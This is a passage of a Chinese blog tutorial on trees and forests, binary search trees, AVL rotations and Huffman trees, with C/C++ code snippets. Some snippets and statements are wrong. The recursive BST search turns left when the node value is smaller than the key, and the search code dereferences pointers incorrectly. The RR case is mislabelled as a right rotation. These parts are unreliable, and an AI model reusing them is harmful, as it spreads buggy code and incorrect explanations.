class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="3-树、森林"><a href="#3-树、森林" class="headerlink" title="3 树、森林"></a>3 树、森林</h1><h2 id="3-1-树的存储结构"><a href="#3-1-树的存储结构" class="headerlink" title="3.1 树的存储结构"></a>3.1 树的存储结构</h2><h3 id="3-1-1-双亲表示法"><a href="#3-1-1-双亲表示法" class="headerlink" title="3.1.1 双亲表示法"></a>3.1.1 双亲表示法</h3><p>定义结构数组存放树的结点，每个结点含两个域：</p><ul><li>数据域：存放结点本身信息</li><li>双亲域：指示本结点的双亲结点在数组中位置</li></ul><p><strong>特点：</strong></p><ul><li>对于实现求双亲操作很方便，时间复杂度为$O(1)$</li><li>对于求某结点的孩子结点的操作，则需要询整个数组</li><li>这种存储方式不能直接反映各兄弟结点之间的关系，所以实现求兄弟的操作也比较困难</li></ul><p><img src="https://img-blog.csdnimg.cn/20200629103413543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDEzNDAz,size_10,color_FFFFFF,t_70"></p><h3 id="3-1-2-孩子表示法"><a href="#3-1-2-孩子表示法" class="headerlink" title="3.1.2 孩子表示法"></a>3.1.2 孩子表示法</h3><p>把每个结点的孩子结点排列起来， 以单链表作存储结构，则 n 个结点有 n 个孩子链表，如果是叶子结点则此单链表为空。然后 n 个头指针又组成一个线性表，采用顺序存储结构，存放进一个一维数组中，如图所示：</p><p><img src="https://img-blog.csdnimg.cn/20190528230933949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTk2ODc5,size_16,color_FFFFFF,t_70"></p><h3 id="3-1-3-孩子兄弟表示法"><a href="#3-1-3-孩子兄弟表示法" class="headerlink" title="3.1.3 孩子兄弟表示法"></a>3.1.3 孩子兄弟表示法</h3><p>对于树这样的层级结构来说，只研究结点的孩子是不行的，我们观察后发现，任意一棵树， 它的结点的第一个孩子如果存在就是唯一的，它的右兄弟如果存在也是唯一的。 因此，我们设置两个指针，分别指向该结点的第一个孩子和此结点的右兄弟。</p><p><img src="https://img-blog.csdnimg.cn/20190528232227915.png"></p><p>其中 $data$ 是数据域，$firstchild$ 为指针域，存储该结点的第一个孩子结点的存储地址，$rightsib$ 是指针域，存储该结点的右兄弟结点的存储地址。</p><p><img src="https://img-blog.csdnimg.cn/20190528232326501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTk2ODc5,size_16,color_FFFFFF,t_70"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">CSNode</span></span><br><span class="line">&#123;</span><br><span class="line">ElemType data;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">CSNode</span> *firstChild，*nextSibling;</span><br><span class="line">&#125;CSNode, *CSTree;</span><br></pre></td></tr></table></figure><p><strong>特点：</strong></p><ul><li>存储方式比较灵活，可以方便地实现树转换为二叉树的操作，易于查找结点的孩子和兄弟等</li><li>从当前结点查找其双亲结点比较麻烦</li></ul><h2 id="3-2-树、森林与二叉树的转换"><a href="#3-2-树、森林与二叉树的转换" class="headerlink" title="3.2 树、森林与二叉树的转换"></a>3.2 树、森林与二叉树的转换</h2><p>由于二叉树和树都可以用二叉链表作为存储结构，因此以二叉链表作为媒介可以导出树与二叉树的一个对应关系，即给定一棵树，可以找到唯一的一棵二叉树与之对应。</p><p>从物理结构上看，它们的二叉链表是相同的，只是解释不同而已。</p><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610080708201.png"></p><h3 id="3-2-1-树转换成二叉树"><a href="#3-2-1-树转换成二叉树" class="headerlink" title="3.2.1 树转换成二叉树"></a>3.2.1 树转换成二叉树</h3><p>将树转换为二叉树的画法：</p><ol><li>加线：在兄弟之间加一连线</li><li>抹线：对每个结点，除了其左孩子外，去除其与其余孩子之间的关系旋转：</li><li>以树的根结点为轴心，将整树顺时针转45°</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610081102052.png"></p><h3 id="3-2-2-二叉树转换为树"><a href="#3-2-2-二叉树转换为树" class="headerlink" title="3.2.2 二叉树转换为树"></a>3.2.2 二叉树转换为树</h3><p>将二叉树转换为树的画法：</p><ol><li>加线：若p结点是双亲结点的左孩子，则将p的右孩子，右孩子的右孩子，……沿分支找到的所有右孩子，都与p的双亲用线连起来抹线：</li><li>抹掉原二叉树中双亲与右孩子之间的连线调整：将结点按层次排列，形成树结构</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610081238981.png"></p><h3 id="3-2-3-森林转换成二叉树"><a href="#3-2-3-森林转换成二叉树" class="headerlink" title="3.2.3 森林转换成二叉树"></a>3.2.3 森林转换成二叉树</h3><p>将森林转换为二叉树的画法：</p><ol><li>将各棵树分别转换成二叉树</li><li>将每棵树的根结点用线相连以第一棵树根结点为二叉树的根</li><li>以根结点为轴心，顺时针旋转，构成二叉树型结构</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610081402641.png"></p><h3 id="3-2-4-二叉树转换成森林"><a href="#3-2-4-二叉树转换成森林" class="headerlink" title="3.2.4 二叉树转换成森林"></a>3.2.4 二叉树转换成森林</h3><p>将二叉树转换为森林的画法：</p><ol><li>抹线：将二叉树中根结点与其右孩子连线，及沿右分支搜索到的所有右孩子间连线全部抹掉，使之变成孤立的二叉树还原</li><li>将孤立的二叉树还原成树</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610081503376.png"></p><h2 id="3-3-树的遍历"><a href="#3-3-树的遍历" class="headerlink" title="3.3 树的遍历"></a>3.3 树的遍历</h2><p>树的遍历是指按一定规律走遍树的各个顶点，且使每一顶点仅被访问一次，即找一个完整而有规律的走法，以得到树中所有结点的一个线性排列。</p><p>主要有3种方式：</p><ol><li>先根（序）遍历：先访问树的根结点，然后依次先根遍历根的每棵子树</li><li>后根（序）遍历：先依次后根遍历每棵子树，然后访问根结点</li><li>按层次遍历：先访问第一层上的结点，然后依次遍历第二层，……第n层的结点</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610082953031.png"></p><h2 id="3-4-森林的遍历"><a href="#3-4-森林的遍历" class="headerlink" title="3.4 森林的遍历"></a>3.4 森林的遍历</h2><p>按照森林和树相互递归的定义，可得到森林的两种遍历方法。</p><ol><li>先序遍历森林：<ul><li>访问森林中第一棵树的根结点；</li><li>先序遍历第一棵树根结点的子树森林；</li><li>先序遍历除第一棵树后剩余的树构成的森林；</li></ul></li><li>中序遍历森林：<ul><li>中序遍历第一棵树根结点的子树森林；</li><li>访问第一棵树的根结点；</li><li>中序遍历除第一棵树后剩余的树构成的森林；</li></ul></li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610083319326.png"></p><hr><h1 id="4-树与二叉树的应用"><a href="#4-树与二叉树的应用" class="headerlink" title="4 树与二叉树的应用"></a>4 树与二叉树的应用</h1><h2 id="4-1-二叉排序树BST"><a href="#4-1-二叉排序树BST" class="headerlink" title="4.1 二叉排序树BST"></a>4.1 二叉排序树BST</h2><h3 id="4-1-1-二叉排序树的定义"><a href="#4-1-1-二叉排序树的定义" class="headerlink" title="4.1.1 二叉排序树的定义"></a>4.1.1 二叉排序树的定义</h3><p><strong>二叉排序树（Binary Sort Tree）</strong>，又称<strong>二叉查找树</strong>。它是一颗<strong>空树</strong>，或者具有下列性质：</p><ul><li>若它的左子树不为空，则<strong>左子树上所有结点的值均小于它的根结点的值</strong>；</li><li>若它的右子树不为空，则<strong>右子树上所有结点的值均大于它的根结点的值</strong>；</li><li><strong>它的左、右子树分别为二叉排序树</strong></li></ul><p><img src="https://img-blog.csdn.net/20161012223249365"></p><p>根据二叉排序树的定义，左子树结点值 &lt; 根结点值 &lt; 右子树结点值，所以对二叉排序树进行中序遍历，可以得到一个递增的有序序列。</p><h3 id="4-1-2-二叉排序树的查找"><a href="#4-1-2-二叉排序树的查找" class="headerlink" title="4.1.2 二叉排序树的查找"></a>4.1.2 二叉排序树的查找</h3><ul><li>二叉排序树的查找可以用递归来实现；</li><li>先将要查找的关键字和根节点进行比较;</li><li>若和根节点值相同，则返回根节点值；<strong>若比根节点小，就递归查找左子树，若比根节点大，则递归查找右子树</strong>。</li></ul><h4 id="4-1-2-1-递归代码实现"><a href="#4-1-2-1-递归代码实现" class="headerlink" title="4.1.2.1 递归代码实现"></a>4.1.2.1 递归代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bst_search</span><span class="params">(BiTree t, <span class="type">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!t) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (t.data == key) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (t.data &lt; key) <span class="keyword">return</span> <span class="built_in">bst_search</span>(t-&gt;left, key);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">bst_search</span>(t-&gt;right, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-1-2-2-非递归代码实现"><a href="#4-1-2-2-非递归代码实现" class="headerlink" title="4.1.2.2 非递归代码实现"></a>4.1.2.2 非递归代码实现</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bst_search</span><span class="params">(BiTree t, <span class="type">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (t &amp;&amp; key != t.data)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (key &lt; t.data) t = t-&gt;left;</span><br><span class="line">        <span class="keyword">else</span> t = t-&gt;right;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> key == t.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-3-二叉排序树的插入"><a href="#4-1-3-二叉排序树的插入" class="headerlink" title="4.1.3 二叉排序树的插入"></a>4.1.3 二叉排序树的插入</h3><p>先调用<strong>查找操作</strong>将要插入的关键字进行比较，如果在原有的二叉排序树中没有要插入的关键字，则将关键字与查找的结点p（在查找操作中返回的结点）的值进行比较。</p><p><img src="https://img-blog.csdn.net/20161013010452696"></p><ul><li><p><strong>若p为空，则插入关键字赋值给该节点；</strong></p></li><li><p><strong>若小于结点p的值，则插入关键字作为结点p的左子树；</strong></p></li><li><p><strong>若大于结点p的值，则插入关键字作为结点p的右子树；</strong></p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 二叉排序树的插入</span></span><br><span class="line"><span class="comment"> * 当二叉排序树中不存在关键字等于 key 的数据元素时，插入 key 并返回TRUE</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertBST</span><span class="params">(BiTree * T, <span class="type">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BiTree p,s;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">SearchBST</span>( *T, key, <span class="literal">NULL</span>, &amp;p)) &#123;  <span class="comment">// 没找到key</span></span><br><span class="line">        s = (BiTree)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(BiTNode));</span><br><span class="line">        s-&gt;data = key;</span><br><span class="line">        s-&gt;lchild = s-&gt;rchild = <span class="literal">NULL</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!p)</span><br><span class="line">            *T = s;  <span class="comment">// 插入 s 为新的根结点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; p-&gt;data)</span><br><span class="line">            p-&gt;lchild = s;  <span class="comment">//插入 s 为左孩子</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            p-&gt;rchild = s; <span class="comment">// 插入 s 为右孩子</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-4-二叉排序树的删除"><a href="#4-1-4-二叉排序树的删除" class="headerlink" title="4.1.4 二叉排序树的删除"></a>4.1.4 二叉排序树的删除</h3><p>二叉排序树的删除操作相对复杂，因为不能因为删除了结点，让这颗二叉排序树变得不满足二叉排序树的性质，所以对于二叉排序树的删除存在三种情况：</p><ul><li><strong>叶子结点</strong>；（很容易实现删除操作，<strong>直接删除结点即可</strong>）</li><li><strong>仅有左或者右子树的结点</strong>；（容易实现删除操作，<strong>删除结点后，将它的左子树或者右子树整个移动到删除结点的位置</strong>）</li></ul><p><img src="https://img-blog.csdn.net/20161013011213113"></p><ul><li><strong>左右子树都有的结点</strong>，就以右子树内的最小节点取代A。（实现删除操作很复杂）</li></ul><p><img src="https://img-blog.csdn.net/20161013011229472"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DeleteBSTNode</span><span class="params">(BST_P *root, DataType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BST_P p = *root, parent = <span class="literal">NULL</span>, s = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p-&gt;data == data) <span class="comment">//找到要删除的节点了</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* It&#x27;s a leaf node */</span></span><br><span class="line">        <span class="keyword">if</span> (!p-&gt;rchild &amp;&amp; !p-&gt;lchild) </span><br><span class="line">            *root = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只有一个左节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!p-&gt;rchild&amp;&amp;p-&gt;lchild) </span><br><span class="line">            *root = p-&gt;lchild;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 只有一个右节点</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!p-&gt;lchild&amp;&amp;p-&gt;rchild) </span><br><span class="line">            *root = p-&gt;rchild;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//左右节点都不空</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            s = p-&gt;rchild;</span><br><span class="line">            <span class="comment">/* the s without left child */</span></span><br><span class="line">            <span class="keyword">if</span> (!s-&gt;lchild)</span><br><span class="line">                s-&gt;lchild = p-&gt;lchild;</span><br><span class="line">            <span class="comment">/* the s have left child */</span></span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* find the smallest node in the left subtree of s */</span></span><br><span class="line">                <span class="keyword">while</span> (s-&gt;lchild) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">/* record the parent node of s */</span></span><br><span class="line">                    parent = s;</span><br><span class="line">                    s = s-&gt;lchild;</span><br><span class="line">                &#125;</span><br><span class="line">                parent-&gt;lchild = s-&gt;rchild;</span><br><span class="line">                s-&gt;lchild = p-&gt;lchild;</span><br><span class="line">                s-&gt;rchild = p-&gt;rchild;</span><br><span class="line">            &#125;</span><br><span class="line">            *root = s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (data &gt; p-&gt;data) <span class="comment">//向右找</span></span><br><span class="line">        <span class="built_in">DeleteBSTNode</span>(&amp;(p-&gt;rchild), data);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (data &lt; p-&gt;data) <span class="comment">//向左找</span></span><br><span class="line">        <span class="built_in">DeleteBSTNode</span>(&amp;(p-&gt;lchild), data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-1-5-查找效率分析"><a href="#4-1-5-查找效率分析" class="headerlink" title="4.1.5 查找效率分析"></a>4.1.5 查找效率分析</h3><p>二叉排序树的查找效率主要取决于树的高度。</p><ul><li><p>若二叉排序树的左、右子树的高度之差的绝对值不超过1，则这样的二叉排序树称为<strong>平衡二叉树</strong>，它的平均查找长度是$O(logn)$。</p></li><li><p>若二叉排序树是一个只有右（左）孩子的单支树，则其平均查找长度为$O(n)$。</p></li></ul><p>在最坏情况下，构造二叉排序树的输入序列是有序的，则会形成一个倾斜的单支树，此时二叉排序树的性能显著变坏，树的高度也增加为元素个数n，如下图所示。</p><p><img src="https://cache.yisu.com/upload/information/20200623/129/152317.png"></p><p>此时查找性能显著下降。从查找过程来看，二叉排序树与二分查找类似。</p><ul><li>平均时间性能：二叉排序树的查找与二分查找差不多，但是二分查找的判定树唯一，而二叉排序树的查找不唯一，相同的关键字其插入顺序不同可能生成不同的二叉排序树</li><li>维护表的有序性：二叉排序树无须移动结点，只需修改指针即可完成插入和删除操作，平均执行时间为$O(logn)$。二分查找的对象是有序顺序表，若有插入和删除结点的操作，所花的代价是$O(n)$</li></ul><p>当有序表是静态查找表时，宜用顺序表作为其存储结构，采用二分查找实现其查找操作。</p><p>若为动态查找表，应选择二叉排序树作为其逻辑结构。</p><h2 id="4-2-平衡二叉树"><a href="#4-2-平衡二叉树" class="headerlink" title="4.2 平衡二叉树"></a>4.2 平衡二叉树</h2><h3 id="4-2-1-平衡二叉树的定义"><a href="#4-2-1-平衡二叉树的定义" class="headerlink" title="4.2.1 平衡二叉树的定义"></a>4.2.1 平衡二叉树的定义</h3><p>为了避免树的高度增长过快，降低二叉排序树的性能，规定在插入和删除二叉树结点时，要保证任意节点的左、右子树高度差的绝对值不超过1。</p><p>平衡二叉树也叫AVL树，它或者是一颗空树，或者具有以下性质的二叉排序树：</p><ol><li>它的左子树和左子树的高度之差(平衡因子)的绝对值不超过1</li><li>它的左子树和右子树都是一颗平衡二叉树</li></ol><p>平衡的二叉树：</p><p><img src="https://img-blog.csdnimg.cn/20191229163909770.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTE0NTg4,size_16,color_FFFFFF,t_70"></p><p>不平衡的二叉树：</p><p><img src="https://img-blog.csdnimg.cn/20191229164004206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzM3OTE0NTg4,size_16,color_FFFFFF,t_70"></p><h3 id="4-2-2-平衡二叉树的插入"><a href="#4-2-2-平衡二叉树的插入" class="headerlink" title="4.2.2 平衡二叉树的插入"></a>4.2.2 平衡二叉树的插入</h3><p>假设现在有一颗平衡二叉树T，每当插入一个节点时，检查平衡二叉树T是否还是平衡二叉树，只需要调整最小不平衡子树中各节点之间的连接关系，以达到新的平衡。</p><p>即找出节点左右两个子树的深度差的绝对值等于2的结点，调整即可，保证插入一个节点后，还是满足平衡二叉树T。</p><p><img src="https://img-blog.csdnimg.cn/20201228114812183.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbmdqaWxp,size_16,color_FFFFFF,t_70"></p><p>过程分为以下几个步骤：</p><ol><li>T是一颗平衡二叉树</li><li>新增一个结点，并判断有结点平衡因子是否&#x3D;2</li><li>若存在结点平衡因子&#x3D;2，找出结点平衡因子&#x3D;2的结点，并以此结点作为子树</li><li>调整结点，使子树满足平衡二叉树</li></ol><h4 id="4-2-2-1-LL型（单向右旋）"><a href="#4-2-2-1-LL型（单向右旋）" class="headerlink" title="4.2.2.1 LL型（单向右旋）"></a>4.2.2.1 LL型（单向右旋）</h4><p>LL型，结点B右旋即可，使其变成如下情况：</p><ul><li>B为子树的根结点</li><li>A为B的右孩子</li><li>C为B的左孩子</li></ul><p><img src="https://img-blog.csdnimg.cn/20201228143320994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbmdqaWxp,size_16,color_FFFFFF,t_70"></p><h4 id="4-2-2-2-RR型（单向左旋）"><a href="#4-2-2-2-RR型（单向左旋）" class="headerlink" title="4.2.2.2 RR型（单向左旋）"></a>4.2.2.2 RR型（单向左旋）</h4><p>RR型，结点B右旋即可，使其变成如下情况：</p><ul><li>B为子树的根结点</li><li>A为B的左孩子</li><li>C为B的右孩子</li></ul><p><img src="https://img-blog.csdnimg.cn/20201228223204607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbmdqaWxp,size_16,color_FFFFFF,t_70"></p><h4 id="4-2-2-3-LR型（先左后右双旋转）"><a href="#4-2-2-3-LR型（先左后右双旋转）" class="headerlink" title="4.2.2.3 LR型（先左后右双旋转）"></a>4.2.2.3 LR型（先左后右双旋转）</h4><p>LR型，需要操作两个步骤：</p><ol><li>以B结点为子树，单向左旋；</li><li>以A结点为子树，单向右旋。</li></ol><p>使其变成如下情况：</p><ul><li>C为子树的根结点</li><li>B为C的左孩子</li><li>A为C的右孩子</li></ul><p><img src="https://img-blog.csdnimg.cn/2020122911271627.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbmdqaWxp,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/b9aa779dd28c8b668ab623cabd43cd52.gif"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/9ff53c6867737534c4abcb4b37c13ce2.gif"></p><h4 id="4-2-2-4-RL型（先右后左双旋转）"><a href="#4-2-2-4-RL型（先右后左双旋转）" class="headerlink" title="4.2.2.4 RL型（先右后左双旋转）"></a>4.2.2.4 RL型（先右后左双旋转）</h4><p>过程与LR型相反。</p><p><img src="https://img-blog.csdnimg.cn/20201229112318228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RlbmdqaWxp,size_16,color_FFFFFF,t_70"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/edb1c2bb245ff799ac3db84d1dcf56c1.gif"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/8df7ce95862e8e3cdc9d5d6f1c31ab12.gif"></p><h3 id="4-2-3-平衡二叉树的查找"><a href="#4-2-3-平衡二叉树的查找" class="headerlink" title="4.2.3 平衡二叉树的查找"></a>4.2.3 平衡二叉树的查找</h3><p>查找过程与二叉排序树基本相同，假设以Nh表示深度为h的平衡树中含有的最少结点数，显然，有N0&#x3D;0，N1&#x3D;1，N2&#x3D;2，并且Nh&#x3D;Nh-1+Nh-2+1。平衡二叉树的平均查找长度为O(logn)。</p><h2 id="4-3-哈夫曼树和哈夫曼编码"><a href="#4-3-哈夫曼树和哈夫曼编码" class="headerlink" title="4.3 哈夫曼树和哈夫曼编码"></a>4.3 哈夫曼树和哈夫曼编码</h2><h3 id="4-3-1-哈夫曼树"><a href="#4-3-1-哈夫曼树" class="headerlink" title="4.3.1 哈夫曼树"></a>4.3.1 哈夫曼树</h3><p>哈夫曼树（Huffman）：带权路径长度最短的树，树中所有叶结点的带权路径长度之和称为该树的带权路径长度，记为：</p><p>$$<br>w p l&#x3D;\sum_{k&#x3D;1} w_{k} l_{k}<br>$$</p><p>其中，$w_k$是第k个叶结点所带的权值，$l_k$是该叶结点到根节点的路径长度。</p><p>在含有n个带权叶结点的二叉树中，其中带权路径长度（WPL）最小的二叉树称为哈夫曼树，也称最优二叉树。</p><blockquote><p>例：有4个结点，权值分别为7，5，2，4，构造有4个叶子结点的二叉树。</p></blockquote><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610095123083.png"></p><h3 id="4-3-2-哈夫曼树的构造"><a href="#4-3-2-哈夫曼树的构造" class="headerlink" title="4.3.2 哈夫曼树的构造"></a>4.3.2 哈夫曼树的构造</h3><p>根据给定的n个权值${w_1,w_2,……w_n}$，构造n棵只有根结点的二叉树，令其权值为$w_j$。</p><ol><li>将这n个结点分别作为n棵仅含一个结点的二叉树，构成森林F。</li><li>在森林中选取两棵根结点权值最小的树作左右子树，构造一棵新的二叉树，置新二叉树根结点权值为其左右子树根结点权值之和。</li><li>在森林中删除这两棵树，同时将新得到的二叉树加入森林中。</li><li>重复上述两步，直到只含一棵树为止，这棵树即哈夫曼树。</li></ol><p><strong>哈夫曼树的特点</strong>：</p><ol><li>每个初始结点最终都将称为叶结点，且权值越小的结点到根节点的路径长度越大。</li><li>构造过程中共新建了n-1个结点，因此哈夫曼树的结点总数为2n-1。</li><li>每次构造都选择2棵树作为新结点的孩子，因此不存在度为1的结点。</li></ol><p><img src="/2024/06/10/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC5%E7%AB%A0%EF%BC%9A%E6%A0%91%E4%B8%8E%E4%BA%8C%E5%8F%89%E6%A0%91/image-20240610095457532.png"></p><h3 id="4-3-3-哈夫曼编码"><a href="#4-3-3-哈夫曼编码" class="headerlink" title="4.3.3 哈夫曼编码"></a>4.3.3 